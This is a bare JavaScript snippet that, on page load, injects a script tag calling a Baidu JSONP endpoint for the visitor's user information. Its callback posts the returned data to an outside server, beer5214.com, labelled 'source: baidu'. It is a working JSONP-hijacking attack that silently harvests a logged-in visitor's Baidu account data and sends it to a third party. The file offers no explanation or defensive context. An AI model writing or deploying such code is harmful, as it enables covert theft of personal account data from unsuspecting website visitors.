function addScriptTag(src) {
    var script = document.createElement('script');
    script.setAttribute("type", "text/javascript");
    script.src = src;
    document.body.appendChild(script);
}

window.onload = function () {
    if (window.location.href.endsWith('.com/')) {
        addScriptTag('https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback=bd');
    }

}

function bd(data) {
    axios.post('https://www.beer5214.com/api/mock', {
        'source': 'baidu',
        'data': JSON.stringify(data)
    }).then(function (result) {
        console.log(result);
    })
}